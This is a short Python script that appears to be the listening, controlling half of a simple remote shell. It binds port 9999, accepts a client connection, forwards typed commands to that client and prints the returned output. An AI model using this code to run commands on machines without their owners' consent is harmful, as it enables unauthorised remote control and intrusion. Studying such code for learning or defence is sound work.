import sys #Required for implementation Of cmd|terminal commands...@1
import socket #for connecting Two Devices...@2

#Creating a socket @2
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port=9999 #least Used
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error :" + str(msg))

#InterConnecting via sockets and listening for connections (that is from client.py)
def ICon_socket():
    try:
        global host
        global port
        global s

        print("Binding the port : " + str(port))

        s.bind((host,port))
        s.listen(9) #9: No. Of Bad Connections

    except socket.error as msg:
        print("Socket Inter Connection Error : " + str(msg) + "\n" + "Retrying...")
        ICon_socket()

#Accepting the Connection from client and socket must be listening...-->
def socket_accept():
    conn,address = s.accept()
    print("Connection has been ESTABLISHED...|!|!| " + "IP " + address[0] + "Port" + str(address[1]))
    send_cmds(conn)
    conn.close()

#Sending Commands to client..
def send_cmds(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def main():
    create_socket()
    ICon_socket()
    socket_accept()

main()
